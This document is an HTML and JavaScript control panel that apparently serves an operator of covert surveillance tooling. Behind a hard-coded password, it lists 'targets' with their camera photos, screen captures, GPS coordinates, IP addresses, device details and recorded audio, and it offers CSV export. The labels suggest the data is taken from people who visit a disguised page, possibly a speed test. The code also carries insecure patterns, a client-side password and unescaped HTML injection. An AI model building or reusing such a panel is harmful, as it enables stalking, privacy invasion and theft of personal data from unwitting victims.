<!DOCTYPE html>
<html>
<head>
    <title>🔐 ADMIN PANEL</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Share Tech Mono',monospace; background:#0a0a0a; color:#00ff41; padding:20px; }
        .container { max-width:1200px; margin:auto; }
        
        .login-box {
            background:rgba(0,0,0,0.9);
            border:2px solid #00ff41;
            border-radius:10px;
            padding:40px;
            max-width:350px;
            margin:50px auto;
            text-align:center;
            box-shadow:0 0 40px rgba(0,255,65,0.1);
        }
        .login-box h2 { font-family:'Orbitron',monospace; font-size:18px; margin-bottom:20px; letter-spacing:3px; }
        .login-box input {
            width:100%; padding:12px; margin:10px 0;
            background:#0a0a0a; border:1px solid #00ff41; border-radius:5px;
            color:#00ff41; font-family:'Share Tech Mono',monospace;
            font-size:14px;
        }
        .login-box input:focus { outline:2px solid #00ff41; }
        .login-box button {
            width:100%; padding:12px;
            background:#00ff41; color:#0a0a0a;
            border:none; border-radius:5px;
            font-family:'Orbitron',monospace;
            font-size:16px; cursor:pointer;
            font-weight:bold;
            transition:0.3s;
        }
        .login-box button:hover { background:#00cc33; box-shadow:0 0 30px rgba(0,255,65,0.3); }
        .login-box .error { color:#ff0040; margin-top:10px; }
        
        .gallery { display:none; }
        header {
            display:flex;
            justify-content:space-between;
            align-items:center;
            flex-wrap:wrap;
            margin-bottom:20px;
            border-bottom:1px solid rgba(0,255,65,0.2);
            padding-bottom:15px;
        }
        h2 { font-family:'Orbitron',monospace; font-size:20px; letter-spacing:2px; }
        .stats { color:rgba(0,255,65,0.6); font-size:14px; }
        .stats span { color:#00ff41; font-size:22px; font-weight:bold; }
        .header-buttons { display:flex; gap:10px; flex-wrap:wrap; }
        .header-buttons button {
            padding:8px 18px;
            border:1px solid #00ff41;
            background:transparent;
            color:#00ff41;
            border-radius:5px;
            cursor:pointer;
            font-family:'Share Tech Mono',monospace;
            font-size:12px;
            transition:0.3s;
        }
        .header-buttons button:hover { background:rgba(0,255,65,0.1); box-shadow:0 0 20px rgba(0,255,65,0.1); }
        .header-buttons .logout { border-color:#ff0040; color:#ff0040; }
        .header-buttons .logout:hover { background:rgba(255,0,64,0.1); box-shadow:0 0 20px rgba(255,0,64,0.1); }
        .header-buttons .csv-btn { border-color:#ffaa00; color:#ffaa00; }
        .header-buttons .csv-btn:hover { background:rgba(255,170,0,0.1); }
        
        .grid {
            display:grid;
            grid-template-columns:repeat(auto-fill,minmax(320px,1fr));
            gap:20px;
        }
        .card {
            background:rgba(0,0,0,0.8);
            border:1px solid rgba(0,255,65,0.15);
            border-radius:8px;
            overflow:hidden;
            transition:0.3s;
        }
        .card:hover { border-color:#00ff41; box-shadow:0 0 30px rgba(0,255,65,0.05); }
        .card .img-grid { display:grid; grid-template-columns:1fr 1fr; }
        .card .img-grid img {
            width:100%; height:140px; object-fit:cover;
            cursor:pointer;
            border-bottom:1px solid rgba(0,255,65,0.1);
            transition:0.3s;
        }
        .card .img-grid img:hover {
            opacity:0.8;
            transform:scale(1.02);
            box-shadow:0 0 30px rgba(0,255,65,0.1);
        }
        .card .info { padding:12px; font-size:12px; }
        .card .info .time { color:rgba(0,255,65,0.4); font-size:11px; }
        .card .info .delete-btn {
            padding:5px 15px;
            border:1px solid #ff0040;
            background:transparent;
            color:#ff0040;
            border-radius:4px;
            cursor:pointer;
            font-size:11px;
            margin-top:8px;
            transition:0.3s;
        }
        .card .info .delete-btn:hover { background:rgba(255,0,64,0.1); box-shadow:0 0 20px rgba(255,0,64,0.1); }
        .card .info .speed { color:#ffaa00; font-size:11px; }
        .loading, .no-data { text-align:center; padding:40px; font-size:18px; color:rgba(0,255,65,0.3); }
        .audio-player { margin-top:8px; padding:8px; background:rgba(0,0,0,0.5); border-radius:5px; }
        .audio-player audio { width:100%; height:25px; }
        
        /* Image Lightbox */
        .lightbox {
            display:none;
            position:fixed;
            top:0; left:0; right:0; bottom:0;
            background:rgba(0,0,0,0.9);
            z-index:9999;
            justify-content:center;
            align-items:center;
            cursor:pointer;
        }
        .lightbox img {
            max-width:90%;
            max-height:90%;
            border:2px solid #00ff41;
            border-radius:10px;
            box-shadow:0 0 60px rgba(0,255,65,0.2);
        }
        .lightbox .close {
            position:absolute;
            top:20px; right:40px;
            color:#00ff41;
            font-size:40px;
            cursor:pointer;
            font-family:'Orbitron',monospace;
            transition:0.3s;
        }
        .lightbox .close:hover { color:#ff0040; transform:rotate(90deg); }
        .lightbox .caption {
            position:absolute;
            bottom:30px;
            left:50%;
            transform:translateX(-50%);
            color:rgba(0,255,65,0.6);
            font-size:14px;
            background:rgba(0,0,0,0.7);
            padding:10px 20px;
            border-radius:5px;
            border:1px solid rgba(0,255,65,0.2);
        }
        .lightbox .nav {
            position:absolute;
            top:50%;
            transform:translateY(-50%);
            color:#00ff41;
            font-size:50px;
            cursor:pointer;
            padding:20px;
            transition:0.3s;
        }
        .lightbox .nav:hover { color:#ff0040; }
        .lightbox .prev { left:20px; }
        .lightbox .next { right:20px; }
        
        /* Hidden admin link */
        .admin-link-hidden { display:none !important; }
    </style>
</head>
<body>
<div class="container">

<!-- IMAGE LIGHTBOX -->
<div class="lightbox" id="lightbox" onclick="closeLightbox()">
    <span class="close" onclick="closeLightbox()">✕</span>
    <span class="nav prev" onclick="event.stopPropagation(); navigateImage(-1)">◀</span>
    <span class="nav next" onclick="event.stopPropagation(); navigateImage(1)">▶</span>
    <img id="lightboxImg" src="" alt="Full size image" />
    <div class="caption" id="lightboxCaption">Image</div>
</div>

<div class="login-box" id="loginBox">
    <h2>🔐 ACCESS</h2>
    <input type="password" id="passwordInput" placeholder="ENTER PASSWORD" />
    <button onclick="login()">UNLOCK</button>
    <div class="error" id="loginError"></div>
</div>

<div class="gallery" id="gallery">
    <header>
        <div>
            <h2>📊 DATABASE</h2>
            <div class="stats">TARGETS: <span id="total">0</span></div>
        </div>
        <div class="header-buttons">
            <button class="csv-btn" onclick="exportCSV()">📊 EXPORT CSV</button>
            <button class="logout" onclick="logout()">🚪 EXIT</button>
            <button onclick="loadData()">🔄 REFRESH</button>
        </div>
    </header>
    <div class="grid" id="grid"></div>
</div>

<script>
const PASSWORD = 'admin123#@!';
let currentImages = [];
let currentIndex = 0;

function login() {
    const pwd = document.getElementById('passwordInput').value;
    if (pwd === PASSWORD) {
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('gallery').style.display = 'block';
        loadData();
    } else {
        document.getElementById('loginError').textContent = '⛔ ACCESS DENIED!';
    }
}

function logout() {
    document.getElementById('loginBox').style.display = 'block';
    document.getElementById('gallery').style.display = 'none';
    document.getElementById('passwordInput').value = '';
}

function exportCSV() {
    window.open('/api/export-csv', '_blank');
}

// ==========================================
// LIGHTBOX FUNCTIONS - CLICKABLE IMAGES
// ==========================================
function openLightbox(imgSrc, caption) {
    const lightbox = document.getElementById('lightbox');
    const img = document.getElementById('lightboxImg');
    const captionEl = document.getElementById('lightboxCaption');
    
    img.src = imgSrc;
    captionEl.textContent = caption || 'Image';
    lightbox.style.display = 'flex';
    document.body.style.overflow = 'hidden';
}

function closeLightbox() {
    document.getElementById('lightbox').style.display = 'none';
    document.body.style.overflow = 'auto';
}

function navigateImage(direction) {
    if (currentImages.length === 0) return;
    currentIndex = (currentIndex + direction + currentImages.length) % currentImages.length;
    const item = currentImages[currentIndex];
    document.getElementById('lightboxImg').src = item.src;
    document.getElementById('lightboxCaption').textContent = item.caption;
}

// Keyboard navigation
document.addEventListener('keydown', function(e) {
    if (document.getElementById('lightbox').style.display === 'flex') {
        if (e.key === 'Escape') closeLightbox();
        if (e.key === 'ArrowLeft') navigateImage(-1);
        if (e.key === 'ArrowRight') navigateImage(1);
    }
});

// ==========================================
// LOAD DATA
// ==========================================
async function loadData() {
    const grid = document.getElementById('grid');
    const total = document.getElementById('total');
    grid.innerHTML = '<div class="loading">⏳ LOADING DATA...</div>';
    currentImages = [];
    
    try {
        const res = await fetch('/api/admin/get-data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD })
        });
        const data = await res.json();
        
        if (!data.success) {
            grid.innerHTML = '<div class="no-data">⛔ ' + data.message + '</div>';
            return;
        }
        
        total.textContent = data.count || 0;
        
        if (!data.data || data.data.length === 0) {
            grid.innerHTML = '<div class="no-data">📭 NO TARGETS ACQUIRED</div>';
            return;
        }
        
        grid.innerHTML = '';
        let imageIndex = 0;
        
        data.data.forEach(item => {
            const card = document.createElement('div');
            card.className = 'card';
            
            const userPhotoSrc = item.userPhoto || item.cameraImage || '#';
            const screenshotSrc = item.screenshot || '#';
            
            // Store for lightbox
            if (userPhotoSrc !== '#') {
                currentImages.push({ src: userPhotoSrc, caption: 'User Photo - ' + new Date(item.timestamp).toLocaleString() });
            }
            if (screenshotSrc !== '#') {
                currentImages.push({ src: screenshotSrc, caption: 'Screenshot - ' + new Date(item.timestamp).toLocaleString() });
            }
            
            let audioHTML = '';
            if (item.audioData && item.audioData !== 'null') {
                audioHTML = `
                    <div class="audio-player">
                        <audio controls>
                            <source src="${item.audioData}" type="audio/webm">
                        </audio>
                    </div>
                `;
            }
            
            card.innerHTML = `
                <div class="img-grid">
                    <img src="${userPhotoSrc}" 
                         onclick="event.stopPropagation(); openLightbox('${userPhotoSrc}', 'User Photo - ${new Date(item.timestamp).toLocaleString()}')" 
                         onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%230a0a0a%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2250%22 text-anchor=%22middle%22 fill=%22%2300ff41%22 font-size=%2220%22>📸</text></svg>'"
                         title="Click to enlarge" />
                    <img src="${screenshotSrc}" 
                         onclick="event.stopPropagation(); openLightbox('${screenshotSrc}', 'Screenshot - ${new Date(item.timestamp).toLocaleString()}')" 
                         onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%230a0a0a%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2250%22 text-anchor=%22middle%22 fill=%22%2300ff41%22 font-size=%2220%22>🖼️</text></svg>'"
                         title="Click to enlarge" />
                </div>
                <div class="info">
                    <div>📍 ${item.location?.lat?.toFixed(4) || 0}, ${item.location?.lng?.toFixed(4) || 0}</div>
                    <div class="time">🕐 ${new Date(item.timestamp).toLocaleString()}</div>
                    <div>📱 ${item.deviceDetails?.deviceName || 'Unknown'}</div>
                    <div>📡 IP: ${item.ipAddress || 'Unknown'}</div>
                    <div class="speed">🚀 Speed: ${item.networkSpeed?.download || '--'} Mbps, Ping: ${item.networkSpeed?.ping || '--'}ms</div>
                    ${audioHTML}
                    <button class="delete-btn" onclick="deleteData('${item._id}')">🗑️ DELETE</button>
                </div>
            `;
            grid.appendChild(card);
        });
        
    } catch(err) {
        grid.innerHTML = '<div class="no-data">❌ ERROR: ' + err.message + '</div>';
    }
}

async function deleteData(id) {
    if (!confirm('🗑️ CONFIRM DELETE?')) return;
    try {
        await fetch('/api/admin/delete', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password: PASSWORD, id })
        });
        loadData();
    } catch(err) {
        alert('❌ ERROR: ' + err.message);
    }
}

document.getElementById('passwordInput').addEventListener('keypress', e => {
    if (e.key === 'Enter') login();
});
</script>
</body>
</html>
